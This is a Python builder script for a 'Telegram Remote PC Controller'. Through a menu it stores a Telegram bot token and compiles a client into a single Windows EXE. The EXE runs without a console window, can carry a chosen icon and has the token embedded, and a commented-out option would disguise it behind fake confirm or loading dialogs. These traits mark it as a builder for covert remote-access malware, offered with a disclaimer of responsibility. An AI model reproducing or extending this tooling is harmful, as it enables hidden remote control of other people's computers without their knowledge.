# Telegram Remote PC Controller.

# Imports.
from utils import *

from os import system, remove

from os.path import exists

from shutil import rmtree, move


# Print general information.
print_icon()

print(f'{CENTER}Telegram Remote PC Controller.\n{CENTER[:-1]}I do not accept responsibility for any use of this tool.\n')

print('1. Compile bot to .EXE.\n2. Set Telegram bot token.\n3. Mimic with process. (Not-Implemented).\n4. Help.\n5. Exit.\n')

# Main.
while True:
    try:
        command = input('>>> ')

        if command == '1':
            app_name = input('\nApplication name >>> ')

            debug_mode = input('\nDebug (y/N) >>> ')

            icon = input('\nIcon (none if no icon) >>> ')

            with open('NAME', 'w') as name:
                name.write(app_name)

            debug = debug_mode.lower() == 'y'

            icon = None if icon == 'none' else icon

            print('\nStarting...\n')

            if exists(f'{app_name}.exe'):
                remove(f'{app_name}.exe')

            system(f'pyinstaller tg_client.py -F -n="{app_name}" {"--noconsole" if not debug else ""} {f"--icon={icon}" if icon else ""} --add-binary="TOKEN:." --add-binary="NAME:."')

            remove(f'{app_name}.spec')

            rmtree('build')

            move(f'dist\\{app_name}.exe', '.')

            rmtree('dist')

            print(styled(f'\nSuccess. Your EXE -> {app_name}.exe\n', Fore.GREEN, bold=True))

        elif command == '2':
            token = input('\nToken >>> ')

            with open('TOKEN', 'w') as _token:
                _token.write(token)

            print(styled('\nToken updated.\n', Fore.GREEN, bold=True))

        elif command == '3':
            print(styled('\nNot-Implemented.\n', Fore.LIGHTRED_EX, bold=True))

            # print('\nSelect process:\n1. Confirm dialog.\n2. Loading dialog.\n3. Custom process (.py) (IN-DEVELOPMENT).\n4. Reset.\n')

            # process = input('Process >>> ')

            # if process == '1':
            #     title = input('\nTitle >>> ')
            #     text = input('\nText >>> ')

            #     set_mimic(CONFIRM_DIALOG, (title, text))

            #     print(styled('\nSet MIMIC to CONFIRM_DIALOG.\n', Fore.GREEN, bold=True))

            # elif process == '2':
            #     title = input('\nTitle >>> ')
            #     text = input('\nText >>> ')

            #     set_mimic(LOADING_DIALOG, (title, text))

            #     print(styled('\nSet MIMIC to LOADING_DIALOG.\n', Fore.GREEN, bold=True))

            # elif process == '3':
            #     print(styled('\nNot-Implemented.\n', Fore.LIGHTRED_EX, bold=True))

            # elif process == '4':
            #     set_mimic(NONE_DIALOG, (title, text))

            #     print(styled('\nSet MIMIC to NONE_DIALOG.\n', Fore.GREEN, bold=True))

            # else:
            #     print(styled('\nInvalid option.\n', Fore.RED, bold=True))

        elif command == '4':
            with open('generic/help', 'r') as _help:
                print(_help.read())

        elif command == '5':
            break

        else:
            print(styled('\nInvalid command.\n', Fore.RED, bold=True))
    except KeyboardInterrupt:
        print(styled('\n\nCTRL + C [KeyboardInterrupt].', Fore.LIGHTGREEN_EX, bold=True))

        break
